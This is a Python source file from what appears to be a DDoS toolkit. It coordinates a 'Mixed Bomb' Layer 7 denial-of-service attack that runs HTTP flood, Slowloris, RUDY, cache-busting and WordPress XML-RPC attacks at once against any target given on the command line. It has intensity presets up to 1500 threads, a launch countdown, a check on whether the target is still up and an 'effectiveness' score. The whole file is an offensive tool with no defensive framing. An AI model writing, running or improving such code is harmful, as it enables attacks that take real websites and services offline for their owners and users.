#!/usr/bin/env python3
"""
Mixed Bomb Attack Module
Method: Layer 7 Combined Multi-Vector Attack
Author: AXMods
"""

import threading
import time
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import all attack methods
try:
    from attack_methods.http_flood import HttpFlood
    from attack_methods.slowloris import Slowloris
    from attack_methods.rudy import RUDY
    from attack_methods.cache_buster import CacheBuster
    from attack_methods.wordpress_xmlrpc import WordPressXMLRPC
except ImportError as e:
    print(f"[!] Error importing attack modules: {e}")
    print("[!] Make sure all attack modules are in the attack_methods folder")
    sys.exit(1)

from utils import print_status
from colorama import Fore, init

init(autoreset=True)

class MixedBomb:
    def __init__(self, target, port=80, duration=60, use_https=False, intensity="medium"):
        """
        Initialize Mixed Bomb (All Methods) Attack
        
        Args:
            target (str): Target URL or IP
            port (int): Target port
            duration (int): Attack duration in seconds
            use_https (bool): Use HTTPS instead of HTTP
            intensity (str): Attack intensity - "low", "medium", "high", "extreme"
        """
        self.target = target
        self.port = port
        self.duration = duration
        self.use_https = use_https
        self.intensity = intensity.lower()
        
        # Set resource allocation based on intensity
        self.intensity_profiles = {
            "low": {
                "http_threads": 200,
                "slowloris_sockets": 100,
                "rudy_sockets": 50,
                "cache_threads": 150,
                "wordpress_threads": 100
            },
            "medium": {
                "http_threads": 400,
                "slowloris_sockets": 200,
                "rudy_sockets": 100,
                "cache_threads": 300,
                "wordpress_threads": 200
            },
            "high": {
                "http_threads": 800,
                "slowloris_sockets": 400,
                "rudy_sockets": 200,
                "cache_threads": 600,
                "wordpress_threads": 400
            },
            "extreme": {
                "http_threads": 1500,
                "slowloris_sockets": 800,
                "rudy_sockets": 400,
                "cache_threads": 1200,
                "wordpress_threads": 800
            }
        }
        
        # Validate intensity
        if self.intensity not in self.intensity_profiles:
            print_status(f"Invalid intensity '{intensity}', defaulting to 'medium'", Fore.YELLOW)
            self.intensity = "medium"
        
        self.resources = self.intensity_profiles[self.intensity]
        
        # Attack instances
        self.attacks = {}
        self.attack_threads = []
        self.is_attacking = False
        
        # Statistics
        self.start_time = None
        self.completed_attacks = 0
        self.total_attacks = 5  # HTTP, Slowloris, RUDY, Cache, WordPress
        
    def _setup_http_flood(self):
        """Setup HTTP Flood attack"""
        try:
            http_attack = HttpFlood(
                target=self.target,
                port=self.port,
                threads=self.resources["http_threads"],
                duration=self.duration,
                use_https=self.use_https
            )
            self.attacks["http_flood"] = http_attack
            print_status(f"✓ HTTP Flood configured: {self.resources['http_threads']} threads", Fore.GREEN)
            return True
        except Exception as e:
            print_status(f"✗ HTTP Flood setup failed: {str(e)[:50]}", Fore.RED)
            return False
    
    def _setup_slowloris(self):
        """Setup Slowloris attack"""
        try:
            slowloris_attack = Slowloris(
                target=self.target,
                port=self.port,
                sockets_count=self.resources["slowloris_sockets"],
                duration=self.duration,
                use_https=self.use_https
            )
            self.attacks["slowloris"] = slowloris_attack
            print_status(f"✓ Slowloris configured: {self.resources['slowloris_sockets']} sockets", Fore.GREEN)
            return True
        except Exception as e:
            print_status(f"✗ Slowloris setup failed: {str(e)[:50]}", Fore.RED)
            return False
    
    def _setup_rudy(self):
        """Setup RUDY attack"""
        try:
            rudy_attack = RUDY(
                target=self.target,
                port=self.port,
                sockets_count=self.resources["rudy_sockets"],
                duration=self.duration,
                use_https=self.use_https,
                content_length=2000000  # 2MB per connection
            )
            self.attacks["rudy"] = rudy_attack
            print_status(f"✓ RUDY configured: {self.resources['rudy_sockets']} sockets", Fore.GREEN)
            return True
        except Exception as e:
            print_status(f"✗ RUDY setup failed: {str(e)[:50]}", Fore.RED)
            return False
    
    def _setup_cache_buster(self):
        """Setup Cache Busting attack"""
        try:
            cache_attack = CacheBuster(
                target=self.target,
                port=self.port,
                threads=self.resources["cache_threads"],
                duration=self.duration,
                use_https=self.use_https
            )
            self.attacks["cache_buster"] = cache_attack
            print_status(f"✓ Cache Buster configured: {self.resources['cache_threads']} threads", Fore.GREEN)
            return True
        except Exception as e:
            print_status(f"✗ Cache Buster setup failed: {str(e)[:50]}", Fore.RED)
            return False
    
    def _setup_wordpress_xmlrpc(self):
        """Setup WordPress XML-RPC attack"""
        try:
            # First check if target looks like a WordPress site
            wordpress_attack = WordPressXMLRPC(
                target=self.target,
                port=self.port,
                threads=self.resources["wordpress_threads"],
                duration=self.duration,
                use_https=self.use_https
            )
            self.attacks["wordpress_xmlrpc"] = wordpress_attack
            print_status(f"✓ WordPress XML-RPC configured: {self.resources['wordpress_threads']} threads", Fore.GREEN)
            return True
        except Exception as e:
            print_status(f"✗ WordPress XML-RPC setup failed: {str(e)[:50]}", Fore.RED)
            return False
    
    def _run_attack(self, attack_name, attack_instance):
        """Run a specific attack"""
        try:
            print_status(f"Starting {attack_name}...", Fore.CYAN)
            
            if attack_name == "http_flood":
                attack_instance.start(method="mixed")
            elif attack_name == "cache_buster":
                attack_instance.start(aggressive=True)
            elif attack_name == "wordpress_xmlrpc":
                attack_instance.start(focus_pingback=True)
            else:
                attack_instance.start()
            
            print_status(f"{attack_name} completed successfully", Fore.GREEN)
            self.completed_attacks += 1
            
        except Exception as e:
            print_status(f"{attack_name} failed: {str(e)[:50]}", Fore.RED)
    
    def _coordinator(self):
        """Coordinate the mixed attack"""
        print_status("🚀 INITIATING MIXED BOMB ATTACK", Fore.RED)
        print_status("All attack vectors launching simultaneously...", Fore.YELLOW)
        
        # Launch all attacks in separate threads
        for attack_name, attack_instance in self.attacks.items():
            thread = threading.Thread(
                target=self._run_attack,
                args=(attack_name, attack_instance),
                daemon=True
            )
            self.attack_threads.append(thread)
            thread.start()
            time.sleep(0.5)  # Stagger launches slightly
        
        # Monitor progress
        while any(thread.is_alive() for thread in self.attack_threads) and self.is_attacking:
            elapsed = time.time() - self.start_time
            progress = (self.completed_attacks / self.total_attacks) * 100
            
            print_status(
                f"Progress: {progress:.1f}% | "
                f"Completed: {self.completed_attacks}/{self.total_attacks} | "
                f"Time: {elapsed:.1f}s",
                Fore.MAGENTA
            )
            time.sleep(2)
        
        # Wait for all threads to complete
        for thread in self.attack_threads:
            thread.join(timeout=5)
    
    def _resource_monitor(self):
        """Monitor system resources during attack"""
        import psutil
        import platform
        
        print_status("📊 SYSTEM RESOURCE MONITOR", Fore.CYAN)
        
        while self.is_attacking:
            try:
                # CPU usage
                cpu_percent = psutil.cpu_percent(interval=1)
                
                # Memory usage
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
                memory_gb = memory.used / (1024 ** 3)
                
                # Network connections
                connections = psutil.net_connections()
                established = len([c for c in connections if c.status == 'ESTABLISHED'])
                
                print_status(
                    f"CPU: {cpu_percent:.1f}% | "
                    f"RAM: {memory_percent:.1f}% ({memory_gb:.2f} GB) | "
                    f"Connections: {established}",
                    Fore.BLUE
                )
                
                # Warning if resources are high
                if cpu_percent > 85:
                    print_status("⚠️  High CPU usage detected", Fore.YELLOW)
                if memory_percent > 85:
                    print_status("⚠️  High memory usage detected", Fore.YELLOW)
                
            except Exception as e:
                print_status(f"Resource monitoring error: {str(e)[:50]}", Fore.RED)
            
            time.sleep(5)
    
    def _target_health_check(self):
        """Check target health during attack"""
        import socket
        
        while self.is_attacking:
            try:
                # Simple connectivity test
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(3)
                
                start_time = time.time()
                result = test_socket.connect_ex((self.target.split('//')[-1].split('/')[0], self.port))
                connect_time = (time.time() - start_time) * 1000
                
                if result == 0:
                    print_status(f"Target responding - Connection time: {connect_time:.0f}ms", Fore.GREEN)
                    test_socket.close()
                else:
                    print_status(f"Target connection failed (error {result})", Fore.RED)
                    
            except socket.timeout:
                print_status("Target timeout - may be affected by attack", Fore.YELLOW)
            except Exception as e:
                print_status(f"Health check error: {str(e)[:30]}", Fore.RED)
            
            time.sleep(10)
    
    def start(self):
        """Start Mixed Bomb attack"""
        print_status("=" * 60, Fore.WHITE)
        print_status("💣 MIXED BOMB ATTACK CONFIGURATION", Fore.RED)
        print_status("=" * 60, Fore.WHITE)
        print_status(f"Target: {self.target}", Fore.WHITE)
        print_status(f"Port: {self.port}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status(f"Intensity: {self.intensity.upper()}", Fore.WHITE)
        print_status(f"HTTPS: {self.use_https}", Fore.WHITE)
        print_status("-" * 60, Fore.WHITE)
        
        # Setup all attacks
        print_status("🛠️  CONFIGURING ATTACK VECTORS...", Fore.CYAN)
        
        setups = [
            ("HTTP Flood", self._setup_http_flood),
            ("Slowloris", self._setup_slowloris),
            ("R.U.D.Y.", self._setup_rudy),
            ("Cache Buster", self._setup_cache_buster),
            ("WordPress XML-RPC", self._setup_wordpress_xmlrpc)
        ]
        
        successful_setups = 0
        for name, setup_func in setups:
            if setup_func():
                successful_setups += 1
            time.sleep(0.5)
        
        if successful_setups < 3:
            print_status(f"⚠️  Only {successful_setups}/5 attacks configured. Continue? (y/n): ", Fore.YELLOW)
            response = input().strip().lower()
            if response != 'y':
                print_status("Attack cancelled", Fore.RED)
                return
        
        print_status(f"✅ {successful_setups}/5 attack vectors configured successfully", Fore.GREEN)
        print_status("-" * 60, Fore.WHITE)
        
        # Countdown
        print_status("🚀 LAUNCHING IN 5 SECONDS...", Fore.RED)
        for i in range(5, 0, -1):
            print_status(f"{i}...", Fore.YELLOW)
            time.sleep(1)
        
        # Start attack
        self.is_attacking = True
        self.start_time = time.time()
        
        # Start coordinator
        coordinator_thread = threading.Thread(target=self._coordinator, daemon=True)
        coordinator_thread.start()
        
        # Start resource monitor
        resource_thread = threading.Thread(target=self._resource_monitor, daemon=True)
        resource_thread.start()
        
        # Start health check
        health_thread = threading.Thread(target=self._target_health_check, daemon=True)
        health_thread.start()
        
        # Run for specified duration
        try:
            for i in range(self.duration, 0, -1):
                if not self.is_attacking:
                    break
                
                if i % 10 == 0:
                    elapsed = self.duration - i
                    print_status(
                        f"⏱️  Time remaining: {i}s | "
                        f"Elapsed: {elapsed}s | "
                        f"Active vectors: {len(self.attack_threads) - self.completed_attacks}",
                        Fore.MAGENTA
                    )
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print_status("\n⚠️  Attack interrupted by user", Fore.YELLOW)
        
        # Stop attack
        self.is_attacking = False
        
        # Wait for coordinator to finish
        coordinator_thread.join(timeout=10)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        success_rate = (self.completed_attacks / successful_setups * 100) if successful_setups > 0 else 0
        
        print_status("=" * 60, Fore.WHITE)
        print_status("🎯 MIXED BOMB ATTACK COMPLETED", Fore.RED)
        print_status("=" * 60, Fore.WHITE)
        print_status(f"Total Duration: {elapsed:.1f} seconds", Fore.WHITE)
        print_status(f"Attack Vectors Configured: {successful_setups}", Fore.GREEN)
        print_status(f"Attack Vectors Completed: {self.completed_attacks}", Fore.CYAN)
        print_status(f"Success Rate: {success_rate:.1f}%", Fore.MAGENTA)
        print_status(f"Intensity Level: {self.intensity.upper()}", Fore.YELLOW)
        print_status(f"Target: {self.target}:{self.port}", Fore.WHITE)
        
        # Effectiveness assessment
        if success_rate >= 80:
            effectiveness = "EXTREME"
            color = Fore.RED
        elif success_rate >= 60:
            effectiveness = "HIGH"
            color = Fore.YELLOW
        elif success_rate >= 40:
            effectiveness = "MEDIUM"
            color = Fore.CYAN
        else:
            effectiveness = "LOW"
            color = Fore.BLUE
        
        print_status(f"Overall Effectiveness: {effectiveness}", color)
        print_status("=" * 60, Fore.WHITE)
        
        return {
            'duration': elapsed,
            'vectors_configured': successful_setups,
            'vectors_completed': self.completed_attacks,
            'success_rate': success_rate,
            'intensity': self.intensity,
            'effectiveness': effectiveness,
            'target': f"{self.target}:{self.port}"
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Mixed Bomb Attack Module")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=45, help="Attack duration in seconds")
    parser.add_argument("-s", "--https", action="store_true", help="Use HTTPS")
    parser.add_argument("-i", "--intensity", choices=["low", "medium", "high", "extreme"],
                       default="medium", help="Attack intensity level")
    
    args = parser.parse_args()
    
    print(f"[*] Starting Mixed Bomb test against {args.target}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] HTTPS: {args.https}")
    print(f"[*] Intensity: {args.intensity.upper()}")
    print("-" * 60)
    
    attack = MixedBomb(
        target=args.target,
        port=args.port,
        duration=args.duration,
        use_https=args.https,
        intensity=args.intensity
    )
    
    try:
        results = attack.start()
        print(f"\n[+] Attack completed!")
        print(f"Effectiveness: {results['effectiveness']}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
